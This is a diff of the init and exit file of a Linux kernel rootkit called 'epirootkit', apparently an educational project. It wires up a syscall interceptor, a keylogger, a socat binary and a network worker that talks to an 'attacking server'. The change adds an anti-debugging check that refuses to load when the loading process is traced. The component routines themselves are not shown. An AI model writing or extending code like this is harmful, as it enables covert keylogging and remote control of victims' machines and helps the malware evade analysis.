@@ -1,11 +1,5 @@
-#include <linux/init.h>
-#include <linux/kernel.h>
-#include <linux/kthread.h>
-#include <linux/module.h>
-#include <linux/uaccess.h>
-
-#include "init.h"
 #include "epirootkit.h"
+#include "init.h"
 
 char *ip = SERVER_IP;
 int port = SERVER_PORT;
@@ -26,7 +20,13 @@ MODULE_PARM_DESC(message, "Message to send to the attacking server");
  * error code if the kernel thread fails to start.
  */
 static int __init epirootkit_init(void) {
-    DBG_MSG("epirootkit: epirootkit_init: module loaded (/^▽^)/\n");
+    DBG_MSG("epirootkit: epirootkit_init: trying to load module...\n");
+
+    // Check if the module is being loaded by a traced process
+    if (current->ptrace & (PT_PTRACED | PT_SEIZED)) {
+        ERR_MSG("epirootkit: epirootkit_init: sorry bro, process loading me is being traced. Aborting load...\n");
+        return -EPERM;
+    }
 
     if (init_interceptor() != SUCCESS) {
         ERR_MSG("epirootkit: epirootkit_init: failed to init interceptor\n");
@@ -38,12 +38,12 @@ static int __init epirootkit_init(void) {
         return -FAILURE;
     }
 
-    // Start a kernel thread that will handle network communication
     if (start_network_worker() != SUCCESS) {
         ERR_MSG("epirootkit: epirootkit_init: failed to start network worker\n");
         return -FAILURE;
     }
 
+    DBG_MSG("epirootkit: epirootkit_init: module loaded... (/^▽^)/\n");
     return SUCCESS;
 }
 
@@ -54,19 +54,12 @@ static int __init epirootkit_init(void) {
  */
 static void __exit epirootkit_exit(void) {
     remove_socat_binaire();
-
-    // stop keylogger
     epikeylog_exit();
-
-    if (stop_network_worker() != SUCCESS) {
-        ERR_MSG("epirootkit: epirootkit_exit: failed to stop network worker\n");
-    }
-
+    stop_network_worker();
     close_worker_socket();
-
     exit_interceptor();
 
-    DBG_MSG("epirootkit: epirootkit_exit: module unloaded\n");
+    DBG_MSG("epirootkit: epirootkit_exit: module unloaded (/^▽^)/\n");
 }
 
 module_init(epirootkit_init);
@@ -74,4 +67,4 @@ module_exit(epirootkit_exit);
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("STDBOOL");
-MODULE_DESCRIPTION("MTF Rootkit - EPI Rootkit");
+MODULE_DESCRIPTION("MTF Rootkit - EPIRootkit");
